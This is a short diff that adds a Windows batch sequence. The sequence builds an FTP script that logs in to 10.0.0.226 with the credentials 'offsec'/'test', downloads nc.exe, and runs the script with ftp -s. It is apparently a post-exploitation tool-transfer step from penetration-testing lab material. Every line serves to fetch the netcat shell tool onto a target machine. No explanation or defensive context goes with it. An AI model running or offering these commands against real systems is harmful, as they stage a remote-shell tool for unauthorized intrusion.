@@ -1,0 +1,7 @@
+echo open 10.0.0.226 21> ftp.txt
+echo offsec>> ftp.txt
+echo test>> ftp.txt
+echo bin>> ftp.txt
+echo GET nc.exe>> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
